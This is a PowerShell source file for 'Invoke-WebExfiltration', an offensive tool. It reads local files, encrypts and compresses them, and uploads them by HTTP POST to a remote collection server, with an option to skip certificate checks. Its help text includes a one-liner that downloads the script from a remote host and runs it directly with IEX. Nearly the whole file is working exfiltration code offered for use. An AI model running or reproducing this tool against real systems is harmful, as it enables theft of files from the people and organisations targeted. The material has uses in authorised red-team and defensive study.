
Function Invoke-WebExfiltration {
     <#
        .SYNOPSIS
        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression and AES-256 encryption)
        Author: Philipp Rieth

        .LINK
        GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration

        .PARAMETER Target
        Specifices the target URL. Needs to be http(s)://<host>:<port>/sendfile

        .PARAMETER Password
        The passworld used for data encryption

        .PARAMETER Proxy
        Proxy to use. Format: http://<proxy-IP>:<port>

        .PARAMETER Insecure
        If defined, certificate errors like mismatch or self signed will be ignored

        .EXAMPLE
        PS> IWR 'https://192.168.20.102:8000/iwe' -SkipCertificateCheck | IEX

        .EXAMPLE
        PS > IWE  .\file.bin
        [~] Target server: 'https://192.168.20.102:8000/sendfile'
        [*] Password: ********
        [+] Exfiltrating file '.\file.bin'
        [~] All done!

        .EXAMPLE
        PS> ls file* | IWE -Insecure
        [~] Target server: 'https://192.168.20.102:8000/sendfile'
        [*] Password: ********
        [+] Exfiltrating file 'C:\Users\tom\file.bin'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64.gzip'
        [+] Exfiltrating file 'C:\Users\tom\file.bin.zip'
        [~] All done!
    #>

    [cmdletbinding()]
    [alias("IWE")]
    Param(
        [Parameter(
                Position = 0,
                Mandatory = $true,
                ValueFromPipeline = $true
        )]$File,
        [Parameter(
                Position = 1,
                Mandatory = $false
        )]
        [string]$Target = 'TARGET_PLACEHOLDER',
        [string]$Password,
        [string]$Proxy,
        [switch]$Insecure
    )

    Begin {
        Write-Host "[~] Target server: '$target'"
        if ($Proxy){
            Write-Host "[!] Using HTTP proxy: '$Proxy'"
        }
        if ((-Not $Password) -And (-Not $unencrypted)) {
            $Password = Read-Host -MaskInput '[*] Password'

            if (-Not $Password){
                Write-Host "[!] You provided an empty password! Files and file names will not be encrypted."
                $yes_no = Read-Host "[!] Do you wish to continue? (y/N)"

                if ($yes_no -like "y*"){
                    $unencrypted = $true
                    Write-Host "[!] Files and file names will not be encrypted"
                } else {
                    Write-Host "[X] Exit"
                    Break
                }
            }

        }elseif ($Password -and $unencrypted){
            Write-Host "[X] You can't specifiy '-Password' and '-Unencrypted' at the same time"
            break
        }

        Write-Debug "Plaintext password: '$Password'"
    }

    Process {
         if ((Get-Item $file) -is [System.IO.DirectoryInfo]){
             Write-Verbose "'$file' is a directory. Skipping..."
             return
         }

        Write-Host "[+] Exfiltrating file '$file'"

        # read file bytes and get file names
        $file_name = [System.IO.Path]::GetFileName($file)
        $file_bin = [IO.File]::ReadAllBytes($file)

        Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"

         # AES encrypt
         # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256

        $password_sha256 = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
        $aesManaged.Key = $password_sha256

        $encryptor = $aesManaged.CreateEncryptor()
        $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
        $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted

        # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', ''))"
        Write-Debug "Key length:     $($aesManaged.KeySize) Bit ($($aesManaged.KeySize/8) Byte)"
        # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', ''))"
        Write-Debug "AES IV length:  $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4) Bit ($([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8) Byte)"
        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"

        $file_name_utf8 = [System.Text.Encoding]::UTF8.GetBytes($file)
        $file_name_encrypted = $encryptor.TransformFinalBlock($file_name_utf8, 0, $file_name_utf8.Length)
        $file_name_encrypted = $aesManaged.IV + $file_name_encrypted
        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', ''))"

        $aesManaged.Dispose()
        Write-Verbose "AES-256 encrypted '$file_name'"

        # Gzip compress content
        # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
        Write-Verbose "Gzip compressing file '$file_name'"
        # Compress Data via gzip stream
        $ms = New-Object IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream ($ms, [Io.Compression.CompressionMode]"Compress")
        $cs.Write($file_bin_encrypted, 0, $file_bin_encrypted.Length)
        $cs.Close()
        Write-Verbose "Compressed '$file_name'"

        # convert to base64 string
        $b64_bin_gzip = [Convert]::ToBase64String($ms.ToArray())
        $b64_filename = [Convert]::ToBase64String($file_name_encrypted)

        Write-Debug "Base64 file name: $b64_filename"
        Write-Debug "Base64 bin: $b64_bin_gzip"
        $ms.Close()

        $body = @{
            "fn" = "$b64_filename"
            "ct" = "$b64_bin_gzip"
        }

        Write-Verbose "Uploading file '$file_name'"
        $uri = [uri]::EscapeUriString($target)
        # $rest_timeout = 10

        try {
            if ($Proxy){
                # $uriProxy = [uri]::EscapeUriString($Proxy)
                # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                # Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
                # if ($Insecure){} else {}
                Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"

            } else {
                if ($Insecure){
                    Write-Verbose "Ignoring certificate check"
                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
                } else {
                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
                }
            }
        }catch [System.Net.WebException] {
            if($_.Exception.Status -eq 'Timeout'){
                Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
                break
            }else {
                Write-Host "[X] Error: An unexcepted System.Net.WebExpection occured. $($_.Exception.GetType().FullName)"
            }
        }
        catch  [System.Net.Http.HttpRequestException] {
             $response_code = $_.Exception.Response.StatusCode
             $message = $_.Exception.Message

            if ($message -like "No connection could be made*"){
                Write-Host "[X] Error: Could not connect to the server. Got this error: '$($_.Exception.Message)'"
            }
            elseif (-not $response_code){
                Write-Host "[X] Error: Server answered but I got no HTTP(S) return code"
                Write-Host "[X] Error: This could be due to certificate error like mismatch or self signed"
                Write-Host "[X] Error: Try again with parameter '-Insecure'"
            }else {
                Write-Host "[X] Error: Got unexpected response code '$response_code' from server"
                Write-Host "[X] Error: Message from server: '$message'"
            }
             Break
        }
        #catch {
        #    Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
        #    Write-Host "[X] Error: StatusCode:  $($_.Exception.Response.StatusCode.value__)"
        #    Write-Host "[X] Error: StatusDescription:  $($_.Exception.Response.StatusDescription)"
        #    Write-Host "[X] Error: I've no idea what's going on :("
        #    break
        #}

         # Some return code handling
         if ($response.StatusCode -ne '200') {
                Write-Host "[X] Error: Got unexpected response code '$($response.StatusCode)' from server"
                Write-Host "[X] Error: Message from server: '$($response.Content)'"
        }

         Write-Verbose "Uploaded '$file_name'"
         Write-Verbose "Server returned message: '$($response.Content)'"

         if ($response.Content -ne 'Thanks!'){
             Write-Host "[X] Error: Host returned '$($response.Content)'"
             Write-Host "[X] Upload was not successfull. Something is wrong."
             break
         }
    }

     End {
         # Write-Host "[~]"
         Write-Host "[~] All done!"
     }
}